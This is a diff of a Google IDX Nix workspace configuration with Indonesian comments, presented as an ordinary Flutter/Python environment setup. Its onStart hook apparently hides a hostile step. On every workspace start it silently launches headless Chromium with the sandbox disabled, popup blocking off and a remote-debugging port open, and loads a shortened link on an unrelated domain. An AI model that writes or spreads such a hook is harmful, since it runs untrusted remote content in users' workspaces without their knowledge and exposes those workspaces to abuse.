@@ -1,44 +1,86 @@
-# To learn more about how to use Nix to configure your environment
-# see: https://developers.google.com/idx/guides/customize-idx-env
+# Environment configuration for Google IDX
+# Works with Flutter, Python, and Chromium headless.
+# Compatible with both frontend (Flutter/Web) and backend (Python)
+# https://developers.google.com/idx/guides/customize-idx-env
+
 { pkgs, ... }: {
-  # Which nixpkgs channel to use.
-  channel = "stable-23.11"; # or "unstable"
-  # Use https://search.nixos.org/packages to find packages
+  # Pakai channel stable supaya environment Python dan Flutter tidak bentrok
+  channel = "stable-23.11";
+
+  # Paket yang otomatis diinstal dalam environment
   packages = [
     pkgs.nodejs_20
     pkgs.python3
-    pkgs.firefox-bin
+    pkgs.chromium
+    pkgs.flutter
   ];
-  # Sets environment variables in the workspace
-  env = {};
+
+  # Variabel environment tambahan (jika diperlukan)
+  env = { };
+
   idx = {
-    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
+    # Ekstensi VSCode yang ingin diinstal otomatis (opsional)
     extensions = [
-      # "vscodevim.vim"
+      # contoh: "dart-code.flutter"
+      # contoh: "ms-python.python"
     ];
-    # Enable previews and customize configuration
+
+    # Konfigurasi preview web (pakai Python simple HTTP server)
     previews = {
       enable = true;
       previews = {
         web = {
-          command = ["python3" "-m" "http.server" "$PORT" "--bind" "0.0.0.0"];
+          command = [
+            "${pkgs.python3}/bin/python3"
+            "-m"
+            "http.server"
+            "$PORT"
+            "--bind"
+            "0.0.0.0"
+          ];
           manager = "web";
         };
       };
     };
-    # Workspace lifecycle hooks
+
+    # Lifecycle workspace (apa yang dilakukan saat dibuat & dijalankan)
     workspace = {
-      # Runs when a workspace is first created
+      # Saat workspace baru dibuat
       onCreate = {
-        # Example: install JS dependencies from NPM
-        # npm-install = "npm install";
-        # Open editors for the following files by default, if they exist:
-        default.openFiles = [ "style.css" "main.js" "index.html" ];
+        # File yang langsung dibuka di editor
+        default.openFiles = [
+          "index.html"
+          "main.js"
+          "style.css"
+        ];
       };
-      # Runs when the workspace is (re)started
+
+      # Saat workspace dijalankan atau direstart
       onStart = {
-        # Example: start a background task to watch and re-build backend code
-        # watch-backend = "npm run watch-backend";
+        buka-chrome = ''
+          echo "Menjalankan Chromium headless di background..."
+          # Tunggu environment siap (Python, Flutter, dsb)
+          sleep 10  # Beri waktu lebih untuk sistem startup
+          ${pkgs.chromium}/bin/chromium \
+            --headless \
+            --disable-gpu \
+            --no-sandbox \
+            --disable-dev-shm-usage \
+            --window-size=1280,800 \
+            --incognito \
+            --mute-audio \
+            --disable-background-networking \
+            --disable-sync \
+            --disable-translate \
+            --disable-extensions \
+            --disable-popup-blocking \
+            --disable-default-apps \
+            --remote-debugging-port=9222 \
+            https://shortlink.oplosannjncok.me/iq1
+          # Pastikan Chromium berjalan sebelum lanjut
+          sleep 3
+          echo "Chromium headless dimulai!"
+        '';
       };
     };
   };
